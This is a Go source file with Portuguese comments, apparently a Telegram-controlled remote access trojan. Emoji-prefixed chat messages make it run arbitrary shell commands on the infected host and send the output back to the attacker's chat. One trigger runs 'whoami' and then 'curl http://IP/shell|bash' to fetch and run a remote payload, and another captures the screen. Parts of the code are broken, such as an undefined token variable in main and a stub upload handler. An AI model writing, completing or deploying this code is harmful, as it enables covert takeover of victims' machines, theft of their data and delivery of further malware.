package main

import (
	"encoding/json"
	"github.com/go-errors/errors"
	"github.com/go-telegram-bot-api/telegram-bot-api/v5"
	"github.com/joho/godotenv"
	"github.com/kardianos/service"
	"github.com/vova616/screenshot"
	"golang.org/x/text/encoding/ianaindex"
	"image/png"
	"log"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
)

var (
	bot    *tgbotapi.BotAPI
	chatID int64
)

// Inicializar variáveis de ambiente
func init() {
	// Carregar o arquivo .env
	if err := godotenv.Load(); err != nil {
		log.Println("Erro ao carregar o arquivo .env:", err)
	}

	// Obter valores das variáveis de ambiente
	botToken := os.Getenv("TELEGRAM_BOT_TOKEN")
	if botToken == "" {
		log.Fatal("TELEGRAM_BOT_TOKEN não definido no arquivo .env")
	}

	// Converter chatID de string para int64
	chatIDStr := os.Getenv("TELEGRAM_CHAT_ID")
	if chatIDStr == "" {
		log.Fatal("TELEGRAM_CHAT_ID não definido no arquivo .env")
	}

	var err error
	chatID, err = strconv.ParseInt(chatIDStr, 10, 64)
	if err != nil {
		log.Fatal("TELEGRAM_CHAT_ID inválido:", err)
	}

	// Inicializar bot
	bot, err = tgbotapi.NewBotAPI(botToken)
	if err != nil {
		log.Fatal(err)
	}
}

func runCommand(command string) (string, error) {
	var cmd *exec.Cmd

	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/C", command)
	} else {
		cmd = exec.Command("bash", "-c", command)
	}

	output, err := cmd.CombinedOutput()
	if err != nil {
		return "", err
	}
	return string(output), nil
}

func isUTF8Error(err error) bool {
	return strings.Contains(err.Error(), "invalid UTF-8")
}

func tryDecode(data []byte) (string, error) {
	encodings := []string{"utf-8"} // Adicione outras codificaÃ§Ãµes se necessÃ¡rio

	for _, enc := range encodings {
		encObj, _ := ianaindex.MIME.Encoding(enc)
		decoded, err := encObj.NewDecoder().Bytes(data)
		if err == nil {
			return string(decoded), nil
		}
	}

	return "", errors.New("failed to decode using any encoding")
}

func handleMessage(bot *tgbotapi.BotAPI, update tgbotapi.Update) {
	message := strings.TrimSpace(update.Message.Text)

	switch {
	case strings.HasPrefix(message, "ðŸ˜Š"):
		command := message[5:len(message)]

		var cmd *exec.Cmd
		if runtime.GOOS == "windows" {
			cmd = exec.Command("cmd", "/C", command)
		} else {
			cmd = exec.Command("bash", "-c", command)
		}
		out, err := cmd.CombinedOutput()

		if err != nil {
			out = append(out, 0x0a)
			out = append(out, []byte(err.Error())...)
		}

		var outputText string
		err = json.Unmarshal(out, &outputText)
		if err != nil {
			//log.Println("Erro ao decodificar saÃ­da JSON:", err)
			outputText = string(out)
		}

		msg := tgbotapi.NewMessage(chatID, "\n```\n"+outputText+"\n```")
		msg.ParseMode = tgbotapi.ModeMarkdown
		bot.Send(msg)

		//command := message[5:len(message)]
		//var cmd *exec.Cmd
		//if runtime.GOOS == "windows" {
		//	cmd = exec.Command("cmd", "/C", command)
		//} else {
		//	cmd = exec.Command("bash", "-c", command)
		//}
		//out, err := cmd.CombinedOutput()
		//if err != nil {
		//	out = append(out, 0x0a)
		//	out = append(out, []byte(err.Error())...)
		//}

		//var outputText string
		//err = json.Unmarshal(out, &outputText)
		//if err != nil {
		//log.Println("Erro ao decodificar saÃ­da JSON:", err)
		//	outputText = string(out)
		//}
		//msg := tgbotapi.NewMessage(chatID, "\n```\n"+outputText+"\n```")
		//outputJSON, _ := json.Marshal(string(out))
		//response := string(out)
		//msg := tgbotapi.NewMessage(chatID, "\n```\n"+response+"\n```")
		//msg := tgbotapi.NewMessage(chatID, "\n```\n"+string(outputJSON)+"\n```")
		//msg.ParseMode = tgbotapi.ModeMarkdown
		//_, err = bot.Send(msg)
		//if err != nil {
		//	log.Println("Erro ao enviar a mensagem:", err)
		//

	case message == "ðŸ™ƒ":
		output, err := runCommand("dir") // Replace "google.com" with the desired host, and -n for Windows ping
		if err != nil {
			output = err.Error()
		}
		msg := tgbotapi.NewMessage(chatID, "\n"+output+"\n")
		msg.ParseMode = tgbotapi.ModeMarkdown
		bot.Send(msg)

	case message == "â˜ï¸":
		file := update.Message.Text[7:]

		msgToSend := tgbotapi.NewMessage(chatID, "Uploaded file to "+file)
		msgToSend.ParseMode = tgbotapi.ModeMarkdown
		bot.Send(msgToSend)

	case message == "ðŸ˜ˆ":
		info, err := runCommand("whoami")
		if err != nil {
			info = err.Error()
		}
		log_msg := tgbotapi.NewMessage(chatID, "New session created with "+info)
		bot.Send(log_msg)
		output, err := runCommand("curl http://IP/shell|bash")
		if err != nil {
			output = err.Error()
		}
		msg := tgbotapi.NewMessage(chatID, "\n"+output+"\n")
		msg.ParseMode = tgbotapi.ModeMarkdown
		bot.Send(msg)

	case message == "ðŸ“¸":
		img, err := screenshot.CaptureScreen()
		if err != nil {
			log.Println("Error", err)
			return
		}

		// Save the screenshot to a file
		f, err := os.Create("./ss.png")
		if err != nil {
			panic(err)
		}
		err = png.Encode(f, img)
		if err != nil {
			panic(err)
		}
		//bot.Send()

	}
}

func main() {
	bot, err := tgbotapi.NewBotAPI(botToken)
	if err != nil {
		log.Fatal(err)
	}

	u := tgbotapi.NewUpdate(0)
	u.Timeout = 60

	updates := bot.GetUpdatesChan(u)

	for update := range updates {
		if update.Message == nil {
			continue
		}

		handleMessage(bot, update)
	}

	log.Println("Bot stopped")
}